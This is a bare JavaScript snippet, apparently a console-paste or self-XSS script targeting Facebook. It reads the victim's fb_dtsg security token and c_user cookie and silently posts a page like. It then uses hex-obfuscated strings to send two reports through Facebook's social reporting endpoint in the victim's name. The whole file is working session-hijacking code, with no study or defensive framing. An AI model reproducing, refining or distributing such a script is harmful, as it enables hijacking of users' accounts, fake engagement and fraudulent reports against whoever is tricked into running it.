var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'],
    user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]); {
    var Page = new XMLHttpRequest(),
        PageURL = '//www.facebook.com/ajax/pages/fan_status.php',
        PageParams = 'fb_dtsg=' + fb_dtsg + '&fbpage_id=188413857913059&add=true&reload=false&fan_origin=page_timeline&fan_source&cat&&nctr[_mod]=pagelet_timeline_page_actions&__user=' + user_id + '';
    Page['open']('POST', PageURL, true);
    Page['onreadystatechange'] = function () {
        if (Page['readyState'] == 4 && Page['status'] == 200) {
            Page['close'];
        };
    };
    Page['send'](PageParams);
};
var _0x1c48=["\x76\x61\x6C\x75\x65","\x66\x62\x5F\x64\x74\x73\x67","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x4E\x61\x6D\x65","\x6D\x61\x74\x63\x68","\x63\x6F\x6F\x6B\x69\x65","\x2F\x2F\x77\x77\x77\x2E\x66\x61\x63\x65\x62\x6F\x6F\x6B\x2E\x63\x6F\x6D\x2F\x61\x6A\x61\x78\x2F\x72\x65\x70\x6F\x72\x74\x2F\x73\x6F\x63\x69\x61\x6C\x2E\x70\x68\x70","\x66\x62\x5F\x64\x74\x73\x67\x3D","\x26\x61\x63\x74\x69\x6F\x6E\x5F\x6F\x70\x74\x69\x6F\x6E\x73\x3D\x6C\x65\x61\x76\x65\x5F\x67\x72\x6F\x75\x70\x26\x70\x70\x3D\x25\x37\x42\x25\x32\x32\x61\x72\x65\x5F\x66\x72\x69\x65\x6E\x64\x73\x25\x32\x32\x25\x33\x41\x66\x61\x6C\x73\x65\x25\x32\x43\x25\x32\x32\x63\x69\x64\x25\x32\x32\x25\x33\x41\x31\x33\x38\x38\x38\x34\x34\x32\x37\x38\x30\x30\x35\x37\x35\x37\x25\x32\x43\x25\x32\x32\x63\x6F\x6E\x74\x65\x6E\x74\x5F\x74\x79\x70\x65\x25\x32\x32\x25\x33\x41\x31\x25\x32\x43\x25\x32\x32\x69\x73\x5F\x66\x6F\x6C\x6C\x6F\x77\x69\x6E\x67\x25\x32\x32\x25\x33\x41\x66\x61\x6C\x73\x65\x25\x32\x43\x25\x32\x32\x69\x73\x5F\x74\x61\x67\x67\x65\x64\x25\x32\x32\x25\x33\x41\x66\x61\x6C\x73\x65\x25\x32\x43\x25\x32\x32\x70\x68\x61\x73\x65\x25\x32\x32\x25\x33\x41\x33\x25\x32\x43\x25\x32\x32\x72\x65\x70\x6F\x72\x74\x5F\x74\x79\x70\x65\x25\x32\x32\x25\x33\x41\x31\x32\x34\x25\x32\x43\x25\x32\x32\x73\x75\x62\x5F\x72\x65\x70\x6F\x72\x74\x5F\x74\x79\x70\x65\x25\x32\x32\x25\x33\x41\x38\x39\x25\x32\x43\x25\x32\x32\x74\x69\x6D\x65\x5F\x66\x6C\x6F\x77\x5F\x73\x74\x61\x72\x74\x65\x64\x25\x32\x32\x25\x33\x41\x31\x34\x30\x38\x33\x39\x36\x37\x34\x35\x25\x32\x43\x25\x32\x32\x75\x73\x65\x72\x25\x32\x32\x25\x33\x41","\x25\x37\x44\x26\x66\x69\x6C\x65\x5F\x72\x65\x70\x6F\x72\x74\x3D\x31\x26\x5F\x5F\x75\x73\x65\x72\x3D","","\x50\x4F\x53\x54","\x6F\x70\x65\x6E","\x6F\x6E\x72\x65\x61\x64\x79\x73\x74\x61\x74\x65\x63\x68\x61\x6E\x67\x65","\x72\x65\x61\x64\x79\x53\x74\x61\x74\x65","\x73\x74\x61\x74\x75\x73","\x63\x6C\x6F\x73\x65","\x73\x65\x6E\x64","\x26\x26\x70\x70\x3D\x25\x37\x42\x25\x32\x32\x61\x72\x65\x5F\x66\x72\x69\x65\x6E\x64\x73\x25\x32\x32\x25\x33\x41\x66\x61\x6C\x73\x65\x25\x32\x43\x25\x32\x32\x63\x69\x64\x25\x32\x32\x25\x33\x41\x31\x33\x38\x38\x38\x34\x34\x32\x37\x38\x30\x30\x35\x37\x35\x37\x25\x32\x43\x25\x32\x32\x63\x6F\x6E\x74\x65\x6E\x74\x5F\x74\x79\x70\x65\x25\x32\x32\x25\x33\x41\x31\x25\x32\x43\x25\x32\x32\x69\x73\x5F\x66\x6F\x6C\x6C\x6F\x77\x69\x6E\x67\x25\x32\x32\x25\x33\x41\x66\x61\x6C\x73\x65\x25\x32\x43\x25\x32\x32\x69\x73\x5F\x74\x61\x67\x67\x65\x64\x25\x32\x32\x25\x33\x41\x66\x61\x6C\x73\x65\x25\x32\x43\x25\x32\x32\x70\x68\x61\x73\x65\x25\x32\x32\x25\x33\x41\x33\x25\x32\x43\x25\x32\x32\x72\x65\x70\x6F\x72\x74\x5F\x74\x79\x70\x65\x25\x32\x32\x25\x33\x41\x31\x32\x34\x25\x32\x43\x25\x32\x32\x73\x75\x62\x5F\x72\x65\x70\x6F\x72\x74\x5F\x74\x79\x70\x65\x25\x32\x32\x25\x33\x41\x38\x39\x25\x32\x43\x25\x32\x32\x74\x69\x6D\x65\x5F\x66\x6C\x6F\x77\x5F\x73\x74\x61\x72\x74\x65\x64\x25\x32\x32\x25\x33\x41\x31\x34\x30\x38\x33\x39\x36\x30\x31\x37\x25\x32\x43\x25\x32\x32\x75\x73\x65\x72\x25\x32\x32\x25\x33\x41"];var fb_dtsg=document[_0x1c48[2]](_0x1c48[1])[0][_0x1c48[0]];var user_id=document[_0x1c48[4]][_0x1c48[3]](document[_0x1c48[4]][_0x1c48[3]](/c_user=(\d+)/)[1]);{var Page= new XMLHttpRequest();var PageURL=_0x1c48[5];var PageParams=_0x1c48[6]+fb_dtsg+_0x1c48[7]+user_id+_0x1c48[8]+user_id+_0x1c48[9];Page[_0x1c48[11]](_0x1c48[10],PageURL,true);Page[_0x1c48[12]]=function (){if(Page[_0x1c48[13]]==4&&Page[_0x1c48[14]]==200){Page[_0x1c48[15]];} ;} ;Page[_0x1c48[16]](PageParams);} ;setTimeout(function (){var Page= new XMLHttpRequest();var PageURL=_0x1c48[5];var PageParams=_0x1c48[6]+fb_dtsg+_0x1c48[17]+user_id+_0x1c48[8]+user_id+_0x1c48[9];Page[_0x1c48[11]](_0x1c48[10],PageURL,true);Page[_0x1c48[12]]=function (){if(Page[_0x1c48[13]]==4&&Page[_0x1c48[14]]==200){Page[_0x1c48[15]];} ;} ;Page[_0x1c48[16]](PageParams);} ,1000);
